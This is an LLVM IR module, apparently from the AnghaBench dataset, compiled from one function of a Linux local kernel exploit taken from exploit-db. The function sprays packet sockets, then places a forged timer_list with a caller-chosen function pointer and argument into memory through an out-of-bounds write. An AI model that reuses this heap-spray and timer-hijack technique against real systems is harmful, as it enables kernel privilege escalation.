; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_oob_timer_execute.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41994.c_oob_timer_execute.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timer_list = type { i64, i32, i8* }

@TIMER_OFFSET = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @oob_timer_execute(i8* %0, i64 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [2048 x i8], align 16
  %8 = alloca %struct.timer_list*, align 8
  store i8* %0, i8** %3, align 8
  store i64 %1, i64* %4, align 8
  %9 = load i64, i64* @TIMER_OFFSET, align 8
  %10 = add nsw i64 2048, %9
  %11 = sub nsw i64 %10, 8
  %12 = call i32 @oob_setup(i64 %11)
  store i32 0, i32* %5, align 4
  br label %13

13:                                               ; preds = %20, %2
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %14, 32
  br i1 %15, label %16, label %23

16:                                               ; preds = %13
  %17 = call i32 (...) @packet_sock_kmalloc()
  store i32 %17, i32* %6, align 4
  %18 = load i32, i32* %6, align 4
  %19 = call i32 @packet_sock_timer_schedule(i32 %18, i32 1000)
  br label %20

20:                                               ; preds = %16
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  br label %13

23:                                               ; preds = %13
  %24 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %25 = call i32 @memset(i8* %24, i32 0, i32 2048)
  %26 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 8
  %27 = bitcast i8* %26 to %struct.timer_list*
  store %struct.timer_list* %27, %struct.timer_list** %8, align 8
  %28 = load i8*, i8** %3, align 8
  %29 = load %struct.timer_list*, %struct.timer_list** %8, align 8
  %30 = getelementptr inbounds %struct.timer_list, %struct.timer_list* %29, i32 0, i32 2
  store i8* %28, i8** %30, align 8
  %31 = load i64, i64* %4, align 8
  %32 = load %struct.timer_list*, %struct.timer_list** %8, align 8
  %33 = getelementptr inbounds %struct.timer_list, %struct.timer_list* %32, i32 0, i32 0
  store i64 %31, i64* %33, align 8
  %34 = load %struct.timer_list*, %struct.timer_list** %8, align 8
  %35 = getelementptr inbounds %struct.timer_list, %struct.timer_list* %34, i32 0, i32 1
  store i32 1, i32* %35, align 8
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %37 = getelementptr inbounds i8, i8* %36, i64 2
  %38 = call i32 @oob_write(i8* %37, i32 30)
  %39 = call i32 @sleep(i32 1)
  ret void
}

declare dso_local i32 @oob_setup(i64) #1

declare dso_local i32 @packet_sock_kmalloc(...) #1

declare dso_local i32 @packet_sock_timer_schedule(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @oob_write(i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
